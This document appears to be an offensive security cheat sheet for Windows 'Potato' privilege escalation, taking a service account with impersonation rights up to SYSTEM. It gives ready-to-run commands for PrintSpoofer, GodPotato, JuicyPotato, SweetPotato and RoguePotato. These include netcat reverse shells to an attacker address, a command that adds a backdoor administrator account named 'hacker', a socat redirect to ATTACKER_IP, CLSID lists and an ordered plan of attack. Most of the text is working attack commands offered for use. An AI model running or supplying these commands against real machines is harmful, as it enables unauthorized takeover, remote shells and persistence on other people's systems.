# Potato Attacks — Service Account to SYSTEM

Escalate from a service account (SeImpersonatePrivilege / SeAssignPrimaryTokenPrivilege) to NT AUTHORITY\SYSTEM.

**MITRE ATT&CK**: T1134.001 — Token Impersonation/Theft

## Prerequisites

```cmd
whoami /priv
:: Need: SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
:: Common on: IIS AppPool, SQL Server, MSSQL service accounts, network services
```

## PrintSpoofer (Windows 10 / Server 2016-2019)

Most reliable modern technique. Abuses the Print Spooler service to capture a SYSTEM token via named pipe impersonation.

```cmd
:: Interactive SYSTEM shell
PrintSpoofer.exe -i -c cmd.exe

:: Reverse shell
PrintSpoofer.exe -c "C:\temp\nc.exe 10.10.14.1 4444 -e cmd.exe"

:: Execute command
PrintSpoofer.exe -c "whoami"
```

**Source**: https://github.com/itm4n/PrintSpoofer

## GodPotato (Windows 8-11, Server 2012-2022)

Works on all modern Windows versions. Exploits DCOM/OXID resolver to get SYSTEM token.

```cmd
:: Interactive shell
GodPotato.exe -cmd "cmd /c whoami"

:: Reverse shell
GodPotato.exe -cmd "C:\temp\nc.exe -e cmd.exe 10.10.14.1 4444"

:: Add admin user
GodPotato.exe -cmd "net user hacker Pass123! /add && net localgroup Administrators hacker /add"
```

**Source**: https://github.com/BeichenDream/GodPotato

## JuicyPotato (Windows 7-10, Server 2008-2016)

Classic DCOM/BITS CLSID abuse. Does NOT work on Server 2019+ or Windows 10 1809+.

```cmd
:: Interactive shell
JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {4991D34B-80A1-4291-83B6-3328366B9097}

:: Reverse shell
JuicyPotato.exe -l 1337 -p C:\temp\rev.exe -t * -c {4991D34B-80A1-4291-83B6-3328366B9097}

:: With specific CLSID (try different ones if default fails)
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c C:\temp\nc.exe 10.10.14.1 4444 -e cmd.exe" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
```

### Common CLSIDs

| CLSID | Service |
|-------|---------|
| `{4991D34B-80A1-4291-83B6-3328366B9097}` | BITS |
| `{F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}` | MSDTC |
| `{03ca98d6-ff5d-49b8-abc6-03dd84127020}` | WSearch |
| `{8BC3F05E-D86B-11D0-A075-00C04FB68820}` | WMI |

**Source**: https://github.com/ohpe/juicy-potato

## SweetPotato (Windows 7-11, Server 2008-2022)

Combines JuicyPotato + PrintSpoofer + EfsPotato. Tries multiple techniques automatically.

```cmd
:: Auto-select best technique
SweetPotato.exe -p cmd.exe -a "/c whoami > C:\temp\proof.txt"

:: Force specific technique
SweetPotato.exe -p cmd.exe -e EfsPotato
SweetPotato.exe -p cmd.exe -e PrintSpoofer
```

**Source**: https://github.com/CCob/SweetPotato

## RoguePotato (Windows 10 1809+, Server 2019+)

Replacement for JuicyPotato on newer Windows. Requires an attacker-controlled machine to receive OXID resolution.

```cmd
:: On attacker machine: set up socat redirect
socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999

:: On target
RoguePotato.exe -r ATTACKER_IP -e "cmd.exe /c whoami > C:\temp\proof.txt" -l 9999
```

**Source**: https://github.com/antonioCoco/RoguePotato

## Decision Matrix

| Technique | Windows 7-10 (pre-1809) | Windows 10 1809+ | Server 2019+ | Needs External? |
|-----------|:---:|:---:|:---:|:---:|
| **PrintSpoofer** | - | YES | YES | No |
| **GodPotato** | YES | YES | YES | No |
| **JuicyPotato** | YES | - | - | No |
| **SweetPotato** | YES | YES | YES | No |
| **RoguePotato** | - | YES | YES | Yes (socat) |

## Quick Test

```cmd
:: Check if you have the right privilege
whoami /priv | findstr /i "impersonate assign"

:: If SeImpersonatePrivilege is present, try in order:
:: 1. GodPotato (broadest compatibility)
:: 2. PrintSpoofer (simple, reliable on modern)
:: 3. SweetPotato (auto-fallback)
:: 4. JuicyPotato (legacy systems)
```
